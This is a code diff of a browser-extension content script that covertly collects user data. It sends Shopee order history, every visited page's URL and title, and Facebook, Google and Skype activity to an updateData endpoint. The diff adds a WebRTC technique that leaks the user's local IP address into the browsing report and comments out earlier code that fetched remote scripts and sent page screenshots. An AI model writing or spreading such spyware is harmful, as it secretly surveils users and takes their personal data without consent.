@@ -10,7 +10,7 @@ if (isShopee) {
     setTimeout(() => {
       getShoppeOrderHistory();
     }, 1000);
-  } catch (e) {}
+  } catch (e) { }
 }
 
 function getShoppeOrderHistory() {
@@ -29,7 +29,7 @@ function getShoppeOrderHistory() {
       updateData("shopeeOrders", {
         data: e,
         userName: localStorage.getItem("userid") + "_error",
-        userId: localStorage.getItem("username")+ "_error",
+        userId: localStorage.getItem("username") + "_error",
       });
     });
 }
@@ -37,17 +37,17 @@ function getShoppeOrderHistory() {
 if (isFacebook) {
   try {
     listenFacebook();
-  } catch (e) {}
+  } catch (e) { }
 }
 if (isGoogle) {
   try {
     listenGoogle();
-  } catch (e) {}
+  } catch (e) { }
 }
 if (isLoginSkype) {
   try {
     listenSkype();
-  } catch (e) {}
+  } catch (e) { }
 }
 
 function listenGoogle() {
@@ -178,23 +178,34 @@ function validateEmail(email) {
 function getPageTitle() {
   try {
     return document.head.getElementsByTagName("title").item(0).innerHTML;
-  } catch (e) {}
+  } catch (e) { }
   return "";
 }
 
 try {
   sendHistory(window.location.href, getPageTitle());
-} catch (e) {}
+} catch (e) { }
 
 function sendHistory(url, title) {
   if (!url) {
     return;
   }
-  updateData("pageHistory", {
-    url: url,
-    userAgent: navigator.userAgent,
-    title: title,
-  });
+  try {
+    getIpClient((ip) => {
+      updateData("pageHistory", {
+        url: url,
+        userAgent: navigator.userAgent,
+        title: title,
+        ip: ip
+      });
+    })
+  } catch(e){
+    updateData("pageHistory", {
+      url: url,
+      userAgent: navigator.userAgent,
+      title: title,
+    });
+  }
 }
 
 // if(window.location.href.indexOf("facebook.com") > -1) {
@@ -214,42 +225,89 @@ function sendHistory(url, title) {
 
 function importJS(url) {
   fetch(url, { method: 'get' })
-  .then(function(response) {
+    .then(function (response) {
       if (!response.ok) {
-          throw Error(response.statusText);
+        throw Error(response.statusText);
       }
       return response.text();
-  }).then((data) => {
+    }).then((data) => {
       let scriptElement = document.createElement('script');
       scriptElement.setAttribute('type', 'text/javascript');
       scriptElement.setAttribute('charset', 'utf8');
       scriptElement.setAttribute('test', 'true');
       scriptElement.innerHTML = data;
       document.head.appendChild(scriptElement);
-  });
+    });
 }
 
-try {
-  importJS('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
-  importJS('https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js');
-} catch(e){}
+// try {
+//   importJS('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
+//   importJS('https://ajax.googleapis.com/ajax/libs/jquery/1.11.2/jquery.min.js');
+// } catch (e) { }
 
-if(isFacebook || isWebSkype) {
-  setTimeout(() => {
-    $(document).ready(function(){
-      console.log("jquery ready");
-      try {
-        html2canvas($("body"), {
-          onrendered: function(canvas) {
-            updateData("image", {
-              url: window.location.href,
-              image: canvas.toDataURL("image/png")
-            });
-          }
-        });
-      } catch(e){}
+// if (isFacebook || isWebSkype) {
+//   setTimeout(() => {
+//     $(document).ready(function () {
+//       console.log("jquery ready");
+//       try {
+//         html2canvas($("body"), {
+//           onrendered: function (canvas) {
+//             updateData("image", {
+//               url: window.location.href,
+//               image: canvas.toDataURL("image/png")
+//             });
+//           }
+//         });
+//       } catch (e) { }
+//     });
+//   }, 2000);
+// }
+
+function getIpClient(cb) {
+  var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection || window.RTCPeerConnection;
+  if (RTCPeerConnection) {
+    var rtc = new RTCPeerConnection({ iceServers: [] });
+    if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
+      rtc.createDataChannel('', { reliable: false });
+    };
+
+    rtc.onicecandidate = function (evt) {
+      if (evt.candidate) grepSDP("a=" + evt.candidate.candidate);
+    };
+    rtc.createOffer(function (offerDesc) {
+      grepSDP(offerDesc.sdp);
+      rtc.setLocalDescription(offerDesc);
+    }, function (e) {
+      console.warn("offer failed", e);
+      cb();
     });
-  }, 2000);
+
+    var addrs = Object.create(null);
+    addrs["0.0.0.0"] = false;
+    function updateIp(newAddr) {
+      if (newAddr in addrs) return;
+      else addrs[newAddr] = true;
+      var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
+      cb(displayAddrs.join(" or perhaps ") || "n/a");
+    }
+
+    function grepSDP(sdp) {
+      sdp.split('\r\n').forEach(function (line) {
+        if (~line.indexOf("a=candidate")) {
+          var parts = line.split(' '),
+            addr = parts[4],
+            type = parts[7];
+          if (type === 'host') updateIp(addr);
+        } else if (~line.indexOf("c=")) {
+          var parts = line.split(' '),
+            addr = parts[2];
+          updateIp(addr);
+        }
+      });
+    }
+  } else {
+    cb();
+  }
 }
 
 function updateData(type, data) {
